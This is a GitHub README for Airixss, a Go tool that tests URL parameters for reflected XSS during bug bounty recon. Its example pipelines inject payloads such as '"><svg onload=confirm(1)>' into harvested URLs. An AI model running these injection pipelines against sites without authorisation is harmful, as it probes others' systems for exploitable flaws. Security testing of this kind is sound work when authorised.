<h1 align="center">Airixss</h1> <br>

<p align="center">
  <a href="#--usage--explanation">Usage</a> •
  <a href="#--installation--requirements">Installation</a>
</p>

<h3 align="center">Airixss is for checking reflection in recon process to find xss vulnerable endpoints.</h3>

<img src="https://cdn.discordapp.com/attachments/897664569323974706/954517164021403718/unknown.png">

## - Installation & Requirements:
```
> go install github.com/ferreiraklet/airixss@latest

OR

> git clone https://github.com/ferreiraklet/airixss.git

> cd airixss

> go build airixss.go

> chmod +x airixss

> ./airixss -h
```
<br>


## - Usage & Explanation:
  * In Your recon process, you may find endpoints that can be vulnerable to xss,
  
    * Ex: https://redacted.com/index.php?msg=SameValue
  
  * By replacing the "SameValue" to a xss payload, In order to see if there is reflection/vulnerable, it is when you use airixss
  
* Lets say you have a url and you want to test reflection:
  <br>
  
    Airixss reads from stdin:
  
    `echo 'https://redacted.com/index.php?user="><img src=x onerror=confirm(1)>' | airixss -payload 'confirm(1)'`
    <br>
  
    In -payload flag, you need to specify a part of the payload used in url, -payload "value_will_be_checked_reflection"
  
    <br>
    
    **You can use a file containing a list of targets as well**:
  
    `cat targets | airixss -payload "alert(1)"`
  
    <br>
    
 * **You can make use of Airixss with other tools such gau, gauplus, waybackurls, qsreplace and bhedak**
    <br>
    * Another examples of usage:
  
    `echo "http://testphp.vulnweb.com:80/hpp/index.php?pp=x" | qsreplace '"><img src=x onerror=prompt(1)>' | airixss -payload '<img src=x onerror=prompt(1)>'`
    <br>
    `echo "http://testphp.vulnweb.com:80/hpp/index.php?pp=x" | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"`
    <br>
    
    You can use with proxy:
    
    `echo "http://testphp.vulnweb.com" | waybackurls | anew | gf xss | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" --proxy "http://yourproxy"`
    
    You can specify more than one header, OBS: Be careful, the syntax must be exact the same, Ex:
    
   `echo "http://testphp.vulnweb.com" | waybackurls | anew | gf xss | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1) -H "Header1: Value1;Header2: value2"`
    
    

<br>


## This project is for educational and bug bounty porposes only! I do not support any illegal activities!.

If any error in the program, talk to me immediatly.
